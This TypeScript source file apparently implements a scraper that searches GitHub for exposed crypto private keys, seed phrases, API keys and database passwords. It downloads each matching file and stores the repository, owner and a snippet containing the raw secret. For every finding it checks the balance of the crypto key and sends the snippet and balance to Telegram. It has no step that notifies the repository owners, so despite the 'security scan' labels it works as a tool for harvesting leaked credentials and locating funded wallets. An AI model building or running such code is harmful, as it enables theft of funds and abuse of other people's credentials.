import { Octokit } from '@octokit/rest';
import { config } from '../config/index.js';
import { GitHubSearchResult, SensitivePattern, SecurityFinding } from '../types/index.js';
import logger from '../utils/logger.js';
import rateLimiter from '../utils/rate-limiter.js';
import patternMatcher from './pattern-matcher.js';
import supabaseStorage from './supabase-storage.js';
import balanceChecker from './balance-checker.js';
import telegramNotifier from './telegram-notifier.js';

export class GitHubScraper {
  private octokit: Octokit;

  constructor() {
    this.octokit = new Octokit({
      auth: config.github.token,
    });
  }

  /**
   * Main scan method - searches GitHub for sensitive data
   */
  async performScan(): Promise<{
    scanId: string | null;
    totalResults: number;
    findingsCount: number;
  }> {
    logger.info('🚀 Starting GitHub security scan...');

    // Create scan history record
    const scanId = await supabaseStorage.createScanHistory({
      scan_type: 'code',
      query: 'Searching for sensitive patterns',
      status: 'running',
      started_at: new Date().toISOString(),
    });

    if (!scanId) {
      logger.error('Failed to create scan history');
      return { scanId: null, totalResults: 0, findingsCount: 0 };
    }

    try {
      // Get active patterns
      const patterns = await supabaseStorage.getActivePatterns();
      logger.info(`Loaded ${patterns.length} active patterns`);

      if (patterns.length === 0) {
        throw new Error('No active patterns found');
      }

      let totalResults = 0;
      let findingsCount = 0;

      // Search for each sensitive pattern type
      const searchQueries = this.buildSearchQueries(patterns);

      for (const query of searchQueries) {
        logger.info(`Searching with query: ${query.description}`);

        await rateLimiter.waitIfNeeded();

        try {
          const results = await this.searchCode(query.query);
          totalResults += results.length;

          logger.info(`Found ${results.length} results for: ${query.description}`);

          // Process results
          for (const result of results) {
            const findings = await this.processSearchResult(result, patterns, scanId);
            findingsCount += findings;
          }
        } catch (error: any) {
          logger.error(`Error searching for ${query.description}:`, error.message);
        }
      }

      // Update scan history
      await supabaseStorage.updateScanHistory(scanId, {
        status: 'completed',
        completed_at: new Date().toISOString(),
        total_results: totalResults,
        findings_count: findingsCount,
      });

      logger.info(`✅ Scan completed: ${findingsCount} findings from ${totalResults} results`);

      return { scanId, totalResults, findingsCount };
    } catch (error: any) {
      logger.error('Scan failed:', error);

      await supabaseStorage.updateScanHistory(scanId, {
        status: 'failed',
        completed_at: new Date().toISOString(),
        error_message: error.message,
      });

      return { scanId, totalResults: 0, findingsCount: 0 };
    }
  }

  /**
   * Build optimized search queries for GitHub
   */
  private buildSearchQueries(patterns: SensitivePattern[]): Array<{ query: string; description: string }> {
    const queries: Array<{ query: string; description: string }> = [];

    // Group patterns by type for efficient searching
    const criticalKeywords = [
      'PRIVATE_KEY',
      'WALLET_KEY',
      'SECRET_KEY',
      'MNEMONIC',
      'SEED_PHRASE',
    ];

    const apiKeywords = [
      'INFURA_ID',
      'ALCHEMY_KEY',
      'ETHERSCAN_API_KEY',
    ];

    const dbKeywords = [
      'DB_PASSWORD',
      'DB_USER',
    ];

    // Search for critical crypto keys
    queries.push({
      query: `${criticalKeywords.join(' OR ')} in:file`,
      description: 'Critical crypto keys and seeds',
    });

    // Search for API keys
    queries.push({
      query: `${apiKeywords.join(' OR ')} in:file`,
      description: 'Blockchain API keys',
    });

    // Search for database credentials
    queries.push({
      query: `${dbKeywords.join(' OR ')} in:file`,
      description: 'Database credentials',
    });

    // Search in .env files specifically
    queries.push({
      query: `filename:.env ${criticalKeywords[0]}`,
      description: '.env files with potential secrets',
    });

    return queries;
  }

  /**
   * Search GitHub code
   */
  private async searchCode(query: string): Promise<GitHubSearchResult[]> {
    try {
      const response = await this.octokit.rest.search.code({
        q: query,
        per_page: Math.min(config.github.maxResultsPerScan, 100),
        sort: 'indexed',
        order: 'desc',
      });

      // Update rate limit info
      rateLimiter.updateRateLimitInfo(response.headers);

      return response.data.items as any[];
    } catch (error: any) {
      if (error.status === 403) {
        logger.warn('Rate limit exceeded, waiting...');
        await rateLimiter.waitIfNeeded();
      }
      throw error;
    }
  }

  /**
   * Process a single search result
   */
  private async processSearchResult(
    result: GitHubSearchResult,
    patterns: SensitivePattern[],
    scanId: string
  ): Promise<number> {
    let findingsCount = 0;

    try {
      // Get file content
      const fileContent = await this.getFileContent(result);

      if (!fileContent) {
        return 0;
      }

      // Match against patterns
      const matchResults = patternMatcher.matchPatterns(fileContent, patterns);

      for (const matchResult of matchResults) {
        // Only create findings for high-confidence matches
        if (!patternMatcher.isLikelyRealSecret(matchResult)) {
          logger.debug(`Low confidence match skipped: ${matchResult.pattern.pattern_name}`);
          continue;
        }

        // Check if finding already exists
        const exists = await supabaseStorage.findingExists(
          result.repository.html_url,
          result.path,
          matchResult.matches[0]
        );

        if (exists) {
          logger.debug(`Finding already exists, skipping`);
          continue;
        }

        // Create finding
        const finding: Omit<SecurityFinding, 'id'> = {
          scan_id: scanId,
          pattern_id: matchResult.pattern.id,
          repository_url: result.repository.html_url,
          repository_name: result.repository.full_name,
          repository_owner: result.repository.owner.login,
          file_path: result.path,
          code_snippet: this.extractCodeSnippet(fileContent, matchResult.matches[0]),
          matched_pattern: patternMatcher.sanitizeForLogging(matchResult.matches[0]),
          pattern_type: matchResult.pattern.pattern_type,
          severity: matchResult.pattern.severity,
          status: 'new',
          metadata: {
            confidence: matchResult.confidence,
            match_count: matchResult.matches.length,
            file_url: result.html_url,
          },
        };

        const findingId = await supabaseStorage.createFinding(finding);

        if (findingId) {
          findingsCount++;
          logger.warn(`🚨 Security finding created: ${matchResult.pattern.pattern_name}`, {
            repo: finding.repository_name,
            file: finding.file_path,
            severity: finding.severity,
          });

          // Vérifier la balance crypto si c'est une clé/adresse crypto
          const balanceInfo = await balanceChecker.checkBalance(
            finding.pattern_type,
            finding.code_snippet
          );

          // Envoyer notification Telegram avec info de balance
          if (telegramNotifier.isConfigured()) {
            await telegramNotifier.notifyFinding(finding, balanceInfo);
          }
        }
      }
    } catch (error: any) {
      logger.error(`Error processing result:`, error.message);
    }

    return findingsCount;
  }

  /**
   * Get file content from GitHub
   */
  private async getFileContent(result: GitHubSearchResult): Promise<string | null> {
    try {
      const [owner, repo] = result.repository.full_name.split('/');

      const response = await this.octokit.rest.repos.getContent({
        owner,
        repo,
        path: result.path,
      });

      if ('content' in response.data) {
        return Buffer.from(response.data.content, 'base64').toString('utf-8');
      }

      return null;
    } catch (error: any) {
      logger.error(`Error fetching file content:`, error.message);
      return null;
    }
  }

  /**
   * Extract code snippet around the match
   */
  private extractCodeSnippet(content: string, match: string, contextLines: number = 2): string {
    const lines = content.split('\n');
    const matchLineIndex = lines.findIndex((line) => line.includes(match));

    if (matchLineIndex === -1) {
      return match;
    }

    const start = Math.max(0, matchLineIndex - contextLines);
    const end = Math.min(lines.length, matchLineIndex + contextLines + 1);

    return lines.slice(start, end).join('\n');
  }

  /**
   * Get rate limit status
   */
  async getRateLimitStatus(): Promise<any> {
    try {
      const response = await this.octokit.rest.rateLimit.get();
      return response.data.resources.code_search;
    } catch (error) {
      logger.error('Error getting rate limit:', error);
      return null;
    }
  }
}

export default new GitHubScraper();
